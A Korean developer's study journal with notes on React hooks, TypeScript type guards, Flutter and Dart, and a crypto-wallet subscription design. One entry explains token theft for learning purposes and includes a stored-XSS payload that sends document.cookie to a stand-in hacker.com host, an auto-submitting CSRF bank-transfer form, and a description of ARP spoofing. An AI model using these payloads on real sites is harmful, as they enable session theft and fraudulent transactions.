# Today I Learned

## 목차

- [Week 1 (2025-03-03 ~ 2025-03-07)](#week-1-2025-03-03---2025-03-07)
- [Week 2 (2025-03-10 ~ 2025-03-14)](#week-2-2025-03-10---2025-03-14)

---

## Week 1 (2025-03-03 ~ 2025-03-07)

<details>
<summary>2025-03-04 TUE</summary>

### useState

props를 부모에게 받았을 경우 자식 컴포넌트는 무조건 리렌더링됨. (state가 변경되지 않아도 리렌더링이 될수도 있음)

**리액트 리렌더링 조건**
>1. state 변경 시 리렌더링
>2. props 변경 시 리렌더링
>3. 부모 컴포넌트 리렌더링 발생 시 자식 컴포넌트 리렌더링

부모 컴포넌트 리렌더링 발생 시 모든 자식 컴포넌트도 리렌더링되는 것은 부하가 될 수 있다.

~~그러므로 props로 연결된 부분을 없애고 하위 컴포넌트에서 정의를 하는게 나을 수 있다.~~

⇒ 이런 경우 useMemo훅, useCallback, React.memo을 사용해 캐싱할 수 있다.

**setState의 활용**

state의 set 상태변화함수는 상태를 함수를 활용해 변경하는 역할을 한다. onChange나 onClick같은 이벤트리스너와 조합하면 사용자 입력에 따라 상태를 변경하는 기능을 만들 수 있다.

++ state 변수에는 객체도 등록이 가능함. 이를 통해 여러개의 state 변수를 관리하는 것보다 안전하게 관리가 가능함.

상태 변경 시에 다른 부분은 그대로 유지하고 한 부분만 변경하도록하여 적용한다.

- 스프레드 연산자 : …객체명을 통해 객체의 요소들을 한번에 표현할 수 있다.
- 자바스크립트의 문법으로 객체 속성에 동적으로 접근할 때 [벼]

### useMemo

useMemo 훅은 정의한 함수의 의존성 배열 값이 변경되지 않는 경우 이전 실행 결과를 재사용한다. 그래서 특정 컴포넌트의 리렌더링을 막을 수 있다. 

**단, useMemo는 메모리 사용량 증가로 이어지며 성능이 떨어질수도 있다.** 

**또한 메모이제이션 값이 너무 많아지면 관리가 어렵다.** 

### useCallback

useCallback 훅은 함수를 메모이제이션한다. 특정 함수의 실행 결과를 재사용한다.

### 의존성 배열

- 불필요한 재실행을 막고 싶다면 꼭 필요한 값만 의존성 배열에 넣어야 한다.
- 빈 배열을 넣으면 최초 1회만 실행됨. 그 이후로는 변경되는 값이 없기 때문에 다시 실행되지 않음.
- 의존성 배열을 생략하면 useMemo, useEffect 등의 훅이 매번 실행됨 → 최적화 효과가 없음

### useEffect와 useMemo

| Hook | 사용 목적 | 실행 시점 | 반환 값 | 주의할 점 |
| --- | --- | --- | --- | --- |
| `useEffect` | 부수 효과 (Side Effects) 처리 | 렌더링 후 (After Render) 실행 | `undefined` (리턴값 없음) | 비동기 작업, DOM 조작 등에 사용 |
| `useMemo` | 값(Value) 메모이제이션 | 렌더링 중 (During Render) 실행 | 캐싱된 값(Value) | 연산이 무거운 경우에만 사용해야 성능 최적화됨 |

useMemo는 렌더링 도중 실행되며 비동기 작업 불가능

```
💡 useMemo 프로세스

의존성 배열에 있는 값이 변경 → 컴포넌트가 다시 렌더링 → 그 렌더링 과정 중에 useMemo가 실행
```

### useRef

이전 값과 새로운 값을 연결하고, 렌더링과는 무관하게 값이 유지되어야 할 때 사용됨.

```tsx
const a = useRef(초기값); // ref 객체 선언
a.current // ref 객체의 상태 조회
```

리렌더링을 해도 ref객체의 상태는 유지되고 ref객체의 상태가 변해도 렌더링이 발생하지 않는다는 특징을 갖고 있다.

## 번외

### 타입스크립트의 type guard

이전까지 타입스크립트를 사용하면서 `any` 만 안쓰면 되겠지 하며 assertion type 일명 `as` 키워드를 자주 사용해왔다. 그 이유는 null이 올 수 있더라도 변수의 타입이 string 타입이라는 개인적인? 확신이 있었기 때문이다. 

JS에서는 타입 좁히기(type narrowing)가 타입을 더 쉽게 예측할 수 있는 작업이었고, `as` 키워드 또한 type narrowing 중 하나의 수단이라고 생각했다. 

그런데 공부하다보니 이 `as` 의 타입 확정은 오히려 타입스크립트의 타입 검사 기능을 포기하겠다는 것이나 다름없다고 한다. 그 이유는 개발자가 변수에 어떤 타입이 올지 확실히 인지했다 하여도 `as` 선언에서 실수를 한다면 런타임에러가 터지기 전까지 인지할 수 없기 때문이다.

그 이유는 다음과 같다.

1. 자신은 반드시 string 타입이 올 것이라 생각해 as string을 작성함.
2. 하지만 그것은 개발자의 착각일 가능성이 있거나 요구사항 변경에 따라 변하게 될 가능성이 있음
3. 그렇게 컴파일 시점을 자연스럽게 통과하더라도 런타임에서 오류가 터질 수 있음

비유하자면 이러한 방식은 컴파일러에게 “내가 이 타입을 너보다 더 잘알고있음. 믿어주셈 ㅇㅇ” 라고 말하는 것과 같다. 어림도 없다.

### **결론**

as보다 type narrowing의 올바른 기법은 null 체크 혹은 typeof나 instanceof를 사용한 type guard 기법이다. 이러한 type guard 기법은 무조건 타입을 확정짓는 as와 달리 `타입 검사를 통과하면 타입이 확정` 되기 때문에 옳은 방식이다.

### 자바의 instanceof

> </br>  
> typeof나 instanceof를 사용한 type narrowing은 자바에서는 지양해야 한다. 왜냐하면 instanceof 체크가 필요한 부분이 있다면 그 부분은 객체지향적으로 분리가 필요한 부분일 가능성이 높기 때문이다.
> 
> 1. OCP 위반 : 새로운 타입이 추가될 때마다 instanceof 체크를 변경해야 함.
> 2. TDA(tell don’t ask) 위반: 데이터를 요구하지 않고 객체가 자연스럽게 상호작용하도록해야함. 데이터를 요구하는 행위는 두 함수의 데이터 결합이 이뤄졌다는 뜻임
> 3. 다형성 위반 : instanceof 체크는 강제로 그 타입인 상태일 때의 행동을 규정하므로 미리 설정해둔 동작을 벗어난 동작을 함.
> </br>
</details>

<details>
<summary>2025-03-05 WED</summary>

# 토큰 탈취가 일어나는 과정과 대응방안을 설명해주세요
토큰 탈취가 일어나는 과정, 즉 공격자가 토큰을 탈취하는 방법에는 여러가지가 있습니다. 

## XSS(Cross Site Scripting) 공격

XSS는 보안이 취약한 웹사이트에 악의적인 스크립트를 삽입하여 사용자 브라우저에서 실행되도록 하는 공격입니다.

1. 취약점이 있는 웹사이트의 특징?
    
    다음과 같은 웹사이트는 취약점이 있을 수 있습니다.
    
    - 입력값 검증 X : 서버에서 위험한 입력을 검증한다면 사전 방지할 수 있음
    - innerHTML을 사용해 DOM을 직접 조작하는 웹사이트 : innerHTML은 문자열을 HTML로 바꾸기 때문에 이러한 스크립트에 더욱 취약함
    - eval 함수를 사용하는 웹사이트(eval은 입력을 코드로 실행할 수 있는 JS 함수임)
    - HttpOnly 쿠키 미사용 : HttpOnly가 적용된 쿠키는 접근 불가능하므로 보호될 수 있음
    
    해커는 이러한 취약점이 있는 웹사이트에 스크립트를 삽입합니다. 해커와 유저는 서로 다른 클라이언트이기 때문에 서로에게 영향을 주지는 않지만 **해커가 조작한 데이터가 DB에 삽입되는 경우**는 다릅니다.
    

1. 공격자 스크립트의 동작 과정
    
    EX) 해커가 댓글을 작성한 후 그 스크립트가 유저의 PC에서 동작하는 과정
    
    1. 댓글 스크립트
    
    ```tsx
    좋은 글이네요! <script>var img = new Image(); img.src = "https://hacker.com/steal?cookie=" + document.cookie;</script>
    ```
    
    1. 유저 측에서 확인되는 스크립트
    
    ```tsx
    <div class="comment">
      좋은 글이네요! <script>var img = new Image(); img.src = "https://hacker.com/steal?cookie=" + document.cookie;</script>
    </div>
    ```
    
    이런 식으로 서버를 경유해서 스크립트가 저장됩니다.
    
    클라이언트가 이 사이트에 접근했을 때 해커의 사이트로 쿠키와 함께 이미지 요청을 발송하게 됩니다.
    

 

## CSRF 공격

1. **사용자 인증**
    
    사용자가 웹사이트에 로그인하여 인증 쿠키를 받습니다.
    
2. **인증 상태 유지**
    
    브라우저는 해당 웹사이트에 대한 쿠키를 저장하고 유지합니다.
    
3. **악성 사이트 방문**
    
    사용자가 로그인 상태를 유지한 채로 공격자의 웹사이트나 악성 이메일 링크를 클릭합니다.
    
4. **위조된 요청 실행**
    
    공격자의 사이트는 자동으로 대상 웹사이트에 요청을 보내는 코드를 실행합니다. 예를 들면:
    
    - 자동 제출되는 폼
    - 이미지 태그를 이용한 GET 요청
    - JavaScript를 이용한 요청
5. **브라우저의 쿠키 전송**
    
    브라우저는 요청과 함께 대상 웹사이트에 대한 인증 쿠키를 자동으로 전송합니다.
    
6. **서버의 요청 처리**
    
    대상 웹사이트 서버는 유효한 인증 쿠키를 받았으므로 요청이 합법적인 사용자로부터 온 것으로 간주하고 처리합니다.
    

EX) 악성 웹사이트의 HTML에서 사용자의 쿠키를 활용해 요청을 보내는 경우

```tsx
<!-- 악성 웹사이트의 HTML -->
<body onload="document.getElementById('transfer-form').submit()">
  <form id="transfer-form" action="https://bank.example.com/api/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
```

위와 같은 경우 해커가 미리 지정한 value 값으로 계좌이체를 진행하게 됩니다.

### CSRF 방어 방법

1. csrf 토큰을 사용 : 서버에서 생성한 랜덤 토큰을 요청마다 포함시켜 same-site임을 검증
2. same-site 쿠키 속성 : 같은 same site 요청인 경우에만 쿠키 전송
3. Origin 헤더 검증 : CORS를 통해 허용된 Origin 헤더인 경우에 요청을 허용.

## MITM(Man-in-the-Middle) 공격

흔히 말하는 중간에서 공격자가 데이터 전송을 가로채는 기법입니다.

HTTPS로 암호화된 데이터 전송이 아닌 경우 중간에 헤더에 담긴 토큰을 탈취한 후 해석하는 것이 가능합니다.

1. 공격자는 통신 경로(네트워크)에 침입합니다.
    - ARP 스푸핑: 로컬 네트워크의 캐시를 조작해 피해자의 트래픽을 자신에게 리디렉션 하도록 설정함(MAC주소와 IP주소간의 매핑을 조작)
    - DNS 스푸핑: DNS 서버를 조작해 해커의 IP로 요청을 보내도록함
2. 트래픽 가로채기
    
    **ARP 스푸핑**
    
    - 공격자는 로컬 네트워크에서 지속적으로 위조된 ARP 메시지를 브로드캐스트합니다.
    - 이 메시지는 "라우터의 IP 주소는 공격자의 MAC 주소와 연결되어 있다"고 알립니다.
    - 또한 "대상 컴퓨터의 IP 주소는 공격자의 MAC 주소와 연결되어 있다"고 라우터에 알립니다.
    - 피해자의 컴퓨터와 라우터는 ARP 캐시를 업데이트합니다.
    - 결과적으로 피해자와 라우터 사이의 모든 트래픽이 공격자의 컴퓨터를 통과하게 됩니다
</details>

<details>
<summary>2025-03-06 THU</summary>

## 플러터 VS 리액트네이티브
### 크로스 플랫폼 앱이란?
크로스 플랫폼 앱은 하나의 소스 코드로 Android, IOS에서 똑같이 작동하는 앱을 의미합니다.
네이티브 앱과 대조되는 개념입니다.
기존의 네이티브 앱은 Android, IOS가 각각 호환이 안되기 때문에 두개의 앱을 만드는 것과 다름이 없었습니다. 근데 크로스 플랫폼 앱 하나가 있다면 두 운영체제를 동시에 개발하고 운영할 수 있다는 장점이 있습니다.

### 리액트 네이티브란?
JS와 React를 기반으로 만들어졌기 때문에 기본 지식을 알고 있는 사람이라면 RN을 시작할 수 있습니다.
리액트 네이티브는 런타임 중에 JS 브릿지를 생성하고 JS 코드를 네이티브 코드로 변환해서 컴파일함. 그래서 JS의 Object-C API로 IOS 컴포넌트를 만들고 자바 API로 안드로이드 컴포넌트로 렌더링할 수 있음.

### 리액트 네이티브의 차별점?
- 리액트 네이티브는 CodePush라는 시스템을 사용해 기존 출시한 앱을 원격으로 업데이트할 수 있습니다.
- 단, 프로젝트의 리액트 네이티브 버전 업데이트가 어렵습니다.
- 범용적인 개발 언어!(JS/TS)
- 운영체제 별 순정 UI를 사용함.

### 웹 개발자의 접근성이 정말 낮은가?
- 여러 문법들과 Hook, 라이프 사이클은 React와 동일하지만 RN은 모바일이기 때문에 안드로이드, IOS에 대한 기초적인 지식이 필요합니다.

### 플러터란?
Flutter는  ios, Android, 데스크탑, 웹앱을 구현하는 크로스 플랫폼 프레임워크입니다. 다소 생소한 Dart 언어를 사용하는데 플러터는 RN과 달리 별도의 브릿지가 필요없기 때문에 성능이 우수합니다.

### 브릿지가 없지만 Flutter는 어떻게 여러 플랫폼을 지원할까?
- Dart 언어는 앱이 빌드되기 전에 코드를 미리 컴파일하는 Ahead-of-time(AOT) 전략을 지원합니다. 컴파일 타임에 Dart 코드를 네이티브 코드로 컴파일하기 때문에 브릿지가 필요없이 각 플랫폼과 직접 통신할 수 있습니다. 그래서 앱 시작 속도도 빠릅니다.
- 또한 자체적인 위젯을 canvas 위에 직접 렌더링하기 때문에 여러 플랫폼에 동일한 UI를 제공할 수 있습니다. (자체 UI)
- 개발환경도 다양할 뿐더러 다양한 빌드 모드를 지원함

### 플러터의 차별점?
- 플러터의 커뮤니티가 큼
- 자체 디자인 언어를 가진 커스텀 UI를 사용한 앱을 만듬
- 프로젝트의 플러터 버전 업데이트가 쉬움 (아마 Dart는 JS/TS와 달리 자체 의존성을 많이 사용하기 때문인듯. RN은은 open source 의존성을 사용해서 어려운 듯)

</details>

---

## Week 2 (2025-03-10 ~ 2025-03-14)

<details>
<summary>2025-03-10 MON</summary>
Dart는 코드를 여러 운영체제에 맞도록 컴파일 해줌. 

- jit(just in time) : aot와 같이 컴파일 방식은 빌드에 오래 걸리므로 개발 중에는 변경을 확인하는 경우 좋지 않음. 이 때 JIT를 통해 코드를 화면 상으로 바로 확인할 수 있음. 즉, 개발 중에는 JIT 컴파일러를 사용하고 배포 시에는 AOT 컴파일러를 사용함
- aot(ahead of time) : 코드를 바이너리로 컴파일한 후에 배포함.

또한 Dart는 null safety함. 그리고 다른 언어로 컴파일할 수 있다는 장점도 있음. 즉, 여러 플랫폼에 적용하기 좋은 언어임.

Dart와 Flutter는 모두 구글에서 만들어졌기 때문에 서로 잘 맞고 서로를 보완하는 방식으로 발전하는 중임. 이것은 다른 프레임워크에 비해 Flutter가 가진 장점임.

> 기본 플랫폼: 모바일 및 데스크톱 장치를 대상으로 하는 앱의 경우 Dart에는 **JIT(Just-In-Time) 컴파일** 기능이 있는 Dart VM과 기계 코드 생성을 위한 **AOT(Ahead-of-Time) 컴파일러**가 모두 포함되어 있습니다.
> 
> 
> 웹 플랫폼: 웹을 대상으로 하는 앱의 경우 Dart는 개발 또는 프로덕션 목적으로 컴파일할 수 있습니다. 웹 컴파일러는 Dart를 JavaScript로 변환합니다.
> 

쉽게 말해 짜스나 파이썬은 인터프리터 언어의 특성 때문에 앱 프로덕션 환경에서 컴파일 언어에 비해 성능 차이가 있음. 대신 개발 환경에서 매우 빠른 피드백이 가능함. 반대로 자바같은 컴파일 언어는 이미 컴파일된 상태에서 앱을 실행하기 때문에 프로덕션 환경에서 속도가 비교적 빠른 편임. 반대로 개발할 때는 매번 빌드하느라 시간이 다 가기 마련인데.. 아무튼 이걸 짬뽕한 마치 링크드리스트이면서 어레이리스트인듯한 무적같은 포지션을 갖게 됨.(아이디어 좋다)

*JIT 컴파일러는 많은 언어에서 사용되며 런타임에서 핫스팟 최적화 방식을 통해 실행시간을 엄청나게 줄여놨다고 한다. JIT 컴파일러는 프로그램의 실행 시점에 코드를 분석하고 최적화한다. 그래서 현대 어플리케이션은 언어적 차이가 많이 줄어들었다.

### main 함수

- main함수에서 내가 쓴 코드가 호출됨. 반드시 main함수가 있어야 함
- Dart는 또한 세미콜론을 반드시 사용해야 함
- Dart에서는 세미콜론도 하나의 기능을 하는데 세미콜론을 제외함으로서 동작이 달라질 수 있음

### var 키워드

- 암시적 타입
    
    var 타입을 선언하는데 이 부분은 자바스크립트처럼 타입을 추론하고 선언해줌
    
    단 js와 차이점으로는 변수의 타입이 한번 선언되면 그 이후에 다른 타입을 집어넣을 수 없음.
    
- 명시적 타입
    
    String 처럼 명시적으로 선언할 수 있음
    

명시를 하는 것이 반드시 좋은 것은 아니고 Dart 스타일 가이드에서는 지역 변수에는 `var`를, 공개 API나 클래스 필드에는 명시적 타입을 권장함. (지역 변수는 외부에서 타입을 명시한 경우 내부에서 타입 추론이 거의 정확함. 그래서 타입을 따로 명시할 필요가 적으며 코드가 간결해지고 중복된 정보를 줄일 수 있음. 또한 구체적인 타입에 의존하지 않아 추상화 수준을 높게 유지할 수 있음)

*DRY(Don’t Repeat Yourself) 원칙 : 타입 정보를 중복으로 작성하지 않게 함. (추상화 수준 유지, 중복 감소, 변경 감소)

```java
List<String> list = new ArrayList<>(); // 삽입하려는 객체의 타입 정보를 중복 명시하지 않음
```

또한 var변수는 업데이트가 가능함

### dynamic type

dart에서는 타입에 대해 숨통을 틔워준다. `var name;` 이런 식으로 선언하는 경우 name 변수는 어떠한 변수도 담을 수 있다.(컴파일 에러도 안뜸) 근데 권장하지 않는 이유는 역시나 불확실성 때문임. 또한 변수의 타입이 확실하지 않기 때문에 변수 타입이 뭔지 물어봐야 하며 그렇지 않으면 멤버 함수나 멤버 변수를 사용할 수 없음. (TDA원칙 위반: 객체에게 데이터나 타입을 요구함.)

혹은 `dynamic name;` 요런 방식으로 다이나믹 타입을 선언할 수 있음. 

### null safety

- dart는 null에 대한 안정성. 즉, 런타임에서 null 발생 시 오류를 일으킴. null safety는 좋지만 null이 표현하는 ‘아무것도 없음’ 이 필요한 때도 있음.이 경우 `String? name = "name";`  타입 스크립트처럼 ?를 붙여주면 null을 포함할 수 있음.

</details>

<details>
<summary>2025-03-11 TUE</summary>

# 지갑 관련 설계

## 지갑 연동 프로세스

**총 옵션 : 3가지(~~Web3Auth~~, WalletConnect, Metamask SDK)**

3가지 옵션을 제공해서 사용자가 편한 방식을 선택하게 하는게 목표!

**지갑을 최대한 편하게 연동할 수 있도록 구현하기**

1. WalletConnect 프로토콜 기본 구현(오픈 소스 프로토콜. 매우 높은 트래픽이 필요한 경우 릴레이 서버를 구현해야 하지만 그렇지 않은 경우 재단에서 제공하는 무료 공용 릴레이 서버를 사용할 수 있음→ver.2인 경우)
2. MetaMask SDK 직접 연동
3. ~~지갑이 없는 사용자 : 간편 로그인(Web3Auth) 옵션 제공(자체 지갑 생성)~~

***문제는 자체 지갑을 생성하는 경우. 이 경우 지갑에 입금하는 것도 구현해야함. ….. 후순위로 미뤄두도록 하자**

## 지갑 정보 조회 프로세스

- 앱에서 직접 조회 vs 백엔드를 거쳐 조회
- 보안은 역시 백엔드. 특히 조회는 개인키 교환없이 주소만으로 조회가 가능하기 때문에 안전함.(주소로는 개인키를 파악할 수 없음)

## 트랜잭션 쓰기 작업 방식 선택

1. 외부 지갑 앱으로 리디렉션 : 외부 지갑 앱을 호출함. 보안성이 높지만 사용자 경험 감소
2. SDK를 통해 인앱 서명 : 앱 내에서 트랜잭션 서명을 진행함. (best긴 할 듯??) → **사용자 경험 증대를 통해 사용자 이탈률 감소, 구독 전환율 증가를 노림**

## 구독 결제 프로세스

1. **지갑 연결**: 사용자가 앱에서 지갑 연결 (지갑 연동 프로세스에서 진행)
2. **구독 선택**: 사용자가 구독 플랜 선택
3. **결제 요청**: 앱에서 트랜잭션 생성
4. **지갑 승인**: 사용자가 지갑에서 트랜잭션 승인 (인앱 서명으로 변경)
5. **트랜잭션 확인**: 블록체인에서 트랜잭션 확인
6. **구독 활성화**: 백엔드에서 확인 후 서비스 활성화

**백엔드 트랜잭션 확인 방법**

- 트랜잭션 리스닝 방식이 있음.(이벤트 기반)

## 고려사항

- 트랜잭션 확인 지연 : 트랜잭션을 확인하는데 걸리는 시간 동안 **로딩 중** 적용
- 가스비 부족, 네트워크 오류, 각종 오류 등으로 트랜잭션 지연이나 실패될 수 있음. 이런 경우 상태를 꾸준히 모니터링하고 사용자에게 피드백을 제공하는게 중요할 듯
- 이중 확인 : 트랜잭션 해시와 실제 컨트랙트 상태를 모두 확인하고 구독 상태 변경

## 결론

- 프론트엔드 팀 : **쓰기 작업은 앱에서 모두 진행**해야 함(서명 필요함).
- 백엔드 팀 : **조회 작업은 무조건 백엔드를 통해** 적절한 처리 후 전달받기 + 쓰기 작업 발생 시 이벤트 catch! 후 DB 업데이트 및 구독 서비스 활성화. 조회 작업을 위해 주소를 저장해둬야 할 듯
</details>